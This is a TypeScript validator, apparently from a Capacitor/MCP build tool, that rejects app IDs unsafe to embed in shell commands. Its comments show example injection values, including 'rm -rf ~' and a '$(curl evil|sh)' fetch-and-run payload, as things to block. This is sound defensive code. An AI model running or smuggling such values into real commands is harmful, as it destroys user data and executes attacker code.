// src/build/onboarding/mcp/app-id-validation.ts
//
// Command-injection guard for the MCP build hand-off.
//
// The build command embeds the capacitor.config appId directly in a shell
// command string that is either passed to osascript (Terminal.app) or shown
// to an agent to run in its shell.  An attacker who controls the appId (e.g.
// a malicious capacitor.config) could inject arbitrary shell code:
//   com.x; rm -rf ~
//   com.x$(curl evil|sh)
//
// This validator accepts only strict reverse-domain package identifiers:
//   one or more labels of [A-Za-z0-9_-], separated by dots, with at least
//   one separator — e.g. com.example.app, io.capgo.app_1, com.acme.my-app.
//
// The pattern rejects every shell/AppleScript metacharacter:
//   space, ; $ ` ( ) & | > < # / ' " \ newline tab
// and also rejects bare single-label names (no dot).
//
// The regex is intentionally stricter than the init/command.ts appIdRegex so
// that it stays safe even if that regex is relaxed in the future.  Do NOT
// weaken this validator.

/** Strict reverse-domain package identifier pattern (command-injection safe). */
const SAFE_APP_ID = /^[a-z0-9]+(?:[._-][a-z0-9]+)+$/i

/**
 * Returns true only when `appId` is a safe reverse-domain package identifier
 * that can be embedded in a shell command string without risk of injection.
 *
 * Valid examples:   com.example.app   io.capgo.app_1   com.acme.my-app
 * Invalid examples: com.x; rm -rf ~   com.x$(cmd)   nodots   ""
 */
export function isSafeAppIdForCommand(appId: string): boolean {
  return SAFE_APP_ID.test(appId) && appId.includes('.')
}
